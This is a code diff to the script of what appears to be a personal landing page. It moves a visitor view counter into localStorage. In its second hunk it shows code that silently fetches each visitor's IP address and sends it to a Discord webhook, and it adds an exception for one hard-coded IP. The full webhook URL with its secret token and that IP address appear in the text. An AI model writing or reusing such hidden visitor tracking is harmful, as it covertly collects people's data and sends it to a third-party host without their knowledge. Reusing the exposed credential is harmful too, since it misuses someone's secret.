@@ -81,28 +81,35 @@
             const musicControl = document.getElementById('musicControl');
             const volumeIcon = document.getElementById('volumeIcon');
             const volumeControl = document.getElementById('volumeControl');
+            const viewCountElement = document.getElementById('viewCount');
+
+            // Load view count from localStorage
+            let viewCount = localStorage.getItem('viewCount') ? parseInt(localStorage.getItem('viewCount')) : 0;
+            viewCountElement.textContent = viewCount;
 
             enterScreen.addEventListener('click', () => {
                 enterScreen.style.display = 'none';
                 mainContent.classList.remove('hidden');
                 musicControl.classList.remove('hidden');
                 player.playVideo();
-                
+
                 // Increment view count when entering
-                const viewCountElement = document.getElementById('viewCount');
-                let viewCount = parseInt(viewCountElement.textContent);
                 viewCount++;
                 viewCountElement.textContent = viewCount;
+
+                // Save view count to localStorage
+                localStorage.setItem('viewCount', viewCount);
             });
 
             const links = document.querySelectorAll('.link');
-            const viewCountElement = document.getElementById('viewCount');
-            let viewCount = parseInt(viewCountElement.textContent);
 
             links.forEach(link => {
                 link.addEventListener('click', () => {
                     viewCount++;
                     viewCountElement.textContent = viewCount;
+
+                    // Save view count to localStorage
+                    localStorage.setItem('viewCount', viewCount);
                 });
             });
 
@@ -175,6 +182,8 @@
                 .then(data => {
                     console.log('User IP Address:', data.query);
                     
+                    // Check if the IP is not the one we want to exclude
+                    if (data.query !== '86.234.134.179') {
                         // Send the IP address to your Discord webhook
                         fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
                             method: 'POST',
